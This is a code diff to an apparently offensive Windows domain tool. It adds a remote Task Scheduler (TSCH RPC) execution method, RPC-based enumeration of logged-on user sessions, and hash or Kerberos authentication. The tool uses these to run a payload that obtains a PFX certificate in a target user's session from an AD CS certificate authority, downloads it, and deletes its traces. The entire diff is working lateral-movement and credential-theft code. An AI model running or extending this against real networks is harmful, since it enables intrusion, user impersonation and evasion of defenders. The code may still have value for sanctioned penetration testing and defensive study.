@@ -963,6 +963,105 @@ def discover_ca(domain, dc_ip, username, password, nt_hash):
     return None
 
 
+# ── TSCH RPC (direct task scheduler, no WinRM/PSExeSVC) ───────────────────────
+
+def tsch_connect(ip, username, password, nt_hash, domain,
+                 aes_key="", use_krb=False, dc_ip=None):
+    from impacket.dcerpc.v5 import tsch as _tsch, transport as _transport
+    from impacket.dcerpc.v5.dtypes import NULL
+    from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, \
+        RPC_C_AUTHN_LEVEL_PKT_PRIVACY
+
+    binding = r'ncacn_np:%s[\pipe\atsvc]' % ip
+    rpc = _transport.DCERPCTransportFactory(binding)
+    if hasattr(rpc, 'set_credentials'):
+        lm, nt = "", ""
+        if nt_hash:
+            if ":" in nt_hash:
+                lm, nt = nt_hash.split(":", 1)
+            else:
+                nt = nt_hash
+        rpc.set_credentials(username, password or "", domain, lm, nt, aes_key)
+        rpc.set_kerberos(use_krb, dc_ip)
+    dce = rpc.get_dce_rpc()
+    dce.set_credentials(*rpc.get_credentials())
+    if use_krb:
+        dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
+    dce.connect()
+    dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
+    dce.bind(_tsch.MSRPC_UUID_TSCHS)
+    return dce
+
+
+def tsch_register_and_run(dce, task_name, task_xml):
+    from impacket.dcerpc.v5 import tsch as _tsch
+    from impacket.dcerpc.v5.dtypes import NULL
+
+    path = f'\\{task_name}'
+    _tsch.hSchRpcRegisterTask(dce, path, task_xml,
+                              _tsch.TASK_CREATE, NULL, _tsch.TASK_LOGON_NONE)
+    _tsch.hSchRpcRun(dce, path)
+
+
+def tsch_delete(dce, task_name):
+    from impacket.dcerpc.v5 import tsch as _tsch
+    try:
+        _tsch.hSchRpcDelete(dce, f'\\{task_name}')
+    except Exception:
+        pass
+
+
+def enum_sessions_rpc(ip, username, password, nt_hash, domain,
+                      aes_key="", use_krb=False, dc_ip=None):
+    from impacket.dcerpc.v5 import wkst as _wkst, transport as _transport
+    from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, \
+        RPC_C_AUTHN_LEVEL_PKT_PRIVACY
+
+    binding = r'ncacn_np:%s[\pipe\wkssvc]' % ip
+    rpc = _transport.DCERPCTransportFactory(binding)
+    if hasattr(rpc, 'set_credentials'):
+        lm, nt = "", ""
+        if nt_hash:
+            if ":" in nt_hash:
+                lm, nt = nt_hash.split(":", 1)
+            else:
+                nt = nt_hash
+        rpc.set_credentials(username, password or "", domain, lm, nt, aes_key)
+        rpc.set_kerberos(use_krb, dc_ip)
+    dce = rpc.get_dce_rpc()
+    dce.set_credentials(*rpc.get_credentials())
+    if use_krb:
+        dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)
+    dce.connect()
+    dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
+    dce.bind(_wkst.MSRPC_UUID_WKST)
+
+    resp = _wkst.hNetrWkstaUserEnum(dce, 1)
+    dce.disconnect()
+
+    sessions = []
+    seen = set()
+    for entry in resp['UserInfo']['WkstaUserInfo']['Level1']['Buffer']:
+        uname = entry['wkui1_username'].rstrip('\x00')
+        udomain = entry['wkui1_logon_domain'].rstrip('\x00')
+        if uname.endswith('$') or uname.upper() in (
+                'SYSTEM', 'LOCAL SERVICE', 'NETWORK SERVICE',
+                'ANONYMOUS LOGON', 'UMFD-0', 'UMFD-1', 'DWM-1', 'DWM-2'):
+            continue
+        key = f"{udomain}\\{uname}".upper()
+        if key in seen:
+            continue
+        seen.add(key)
+        sessions.append({
+            "session_name": "",
+            "username": uname,
+            "id": len(sessions),
+            "state": "Active",
+            "domain": udomain,
+        })
+    return sessions
+
+
 # ── Session enumeration ──────────────────────────────────────────────────────
 
 def enum_sessions(transport):
@@ -1242,13 +1341,26 @@ def main():
 
     # ── Connect transport
     use_susinternals = (args.exec_method == "smb")
+    use_tsch = (args.exec_method == "tsch")
 
-    if use_susinternals:
+    transport = None
+    dce = None
+    ad_domain = None
+
+    if use_tsch:
+        info("Connecting via TSCH RPC...")
+        try:
+            dce = tsch_connect(ip, args.username, args.password, args.nt_hash,
+                               args.domain, args.aes_key, args.kerberos, args.dc_ip)
+        except Exception as e:
+            die(f"TSCH RPC connection failed: {e}")
+        info("Connected")
+        ad_domain = args.domain if "." in (args.domain or "") else None
+    elif use_susinternals:
         info("Connecting via SMB (PSExeSVC)...")
         transport = SusinternalsExec(
             ip, args.username, args.password, args.nt_hash,
             args.domain, args.dc_ip, args.aes_key, args.kerberos)
-        # probe + AD domain in one call (each psexecsvc call is ~15-30s)
         out, err, rc = _run(transport,
             'powershell -NonInteractive -Command "(Get-WmiObject Win32_ComputerSystem).Domain"')
         if rc != 0 and not out.strip():
@@ -1269,7 +1381,6 @@ def main():
         except Exception as e:
             die(f"WinRM connection failed: {e}")
         info("Connected")
-        ad_domain = None
         out, _, _ = _run_ps(transport,
             '(Get-WmiObject Win32_ComputerSystem).Domain')
         ad_domain = out.strip() if out.strip() and "." in out.strip() else None
@@ -1283,9 +1394,18 @@ def main():
         die(f"SMB connection failed: {e}")
 
     # Enumerate sessions and pick target
-    if use_susinternals:
-        info("Enumerating sessions...")
-    sessions = enum_sessions(transport)
+    if use_tsch:
+        info("Enumerating sessions via RPC...")
+        try:
+            sessions = enum_sessions_rpc(
+                ip, args.username, args.password, args.nt_hash,
+                args.domain, args.aes_key, args.kerberos, args.dc_ip)
+        except Exception as e:
+            die(f"Session enumeration failed: {e}")
+    else:
+        if use_susinternals:
+            info("Enumerating sessions...")
+        sessions = enum_sessions(transport)
     if not sessions:
         die("No active user sessions found.")
 
@@ -1306,11 +1426,18 @@ def main():
 
     template = args.template or "User"
 
-    # Generate and upload payload
+    # Generate payload
     info(f"Generating payload (template: {template})...")
     files = generate_files(
         target_user, user_domain, args.ca, template,
         args.prefix, args.drop_dir, args.exec_wrapper)
+
+    # Upload files (TSCH doesn't need the XML on disk — it's sent via RPC)
+    task_xml_content = None
+    if use_tsch:
+        xml_key = f"{args.prefix}.xml"
+        task_xml_content = files.pop(xml_key).decode("utf-16")
+
     smb_delete_files(smb, args.drop_dir, args.prefix)
     try:
         smb_upload(smb, files, args.drop_dir)
@@ -1319,7 +1446,14 @@ def main():
     info("Payload uploaded")
 
     # Create and trigger scheduled task
-    create_and_run_task(transport, args.task_name, args.drop_dir, args.prefix)
+    if use_tsch:
+        try:
+            tsch_register_and_run(dce, args.task_name, task_xml_content)
+        except Exception as e:
+            die(f"TSCH task creation failed: {e}")
+        info(f"Task '{args.task_name}' created and triggered via RPC")
+    else:
+        create_and_run_task(transport, args.task_name, args.drop_dir, args.prefix)
 
     # Poll for PFX
     info(f"Waiting for PFX (timeout: {args.timeout}s)...")
@@ -1346,8 +1480,12 @@ def main():
                 else:
                     info(f"  {args.prefix}.{ext} NOT found")
             if not args.no_cleanup:
-                cleanup_remote(transport, smb, args.task_name,
-                               args.drop_dir, args.prefix)
+                if use_tsch:
+                    tsch_delete(dce, args.task_name)
+                    smb_delete_files(smb, args.drop_dir, args.prefix)
+                else:
+                    cleanup_remote(transport, smb, args.task_name,
+                                   args.drop_dir, args.prefix)
             die("No PFX produced — check CA reachability and template permissions.")
 
     # Download PFX
@@ -1368,9 +1506,18 @@ def main():
 
     # Cleanup
     if not args.no_cleanup:
-        cleanup_remote(transport, smb, args.task_name,
-                       args.drop_dir, args.prefix)
+        if use_tsch:
+            tsch_delete(dce, args.task_name)
+            smb_delete_files(smb, args.drop_dir, args.prefix)
+        else:
+            cleanup_remote(transport, smb, args.task_name,
+                           args.drop_dir, args.prefix)
 
+    if dce:
+        try:
+            dce.disconnect()
+        except Exception:
+            pass
     if hasattr(transport, 'close'):
         transport.close()
 
@@ -1422,8 +1569,8 @@ def parse_args():
 
     exc = p.add_argument_group("execution")
     exc.add_argument("--exec-method", default="winrm",
-        choices=["winrm", "smb", "manual"],
-        help="Command execution method: winrm (default), smb (psexecsvc), or manual (generate files only)")
+        choices=["winrm", "smb", "tsch", "manual"],
+        help="Command execution method: winrm (default), smb (psexecsvc), tsch (RPC direct), or manual (generate files only)")
     exc.add_argument("--exec-wrapper", default="conhost",
         choices=list(EXEC_METHODS),
         help="Bat execution wrapper: conhost|cmd|powershell|wscript (default: conhost)")
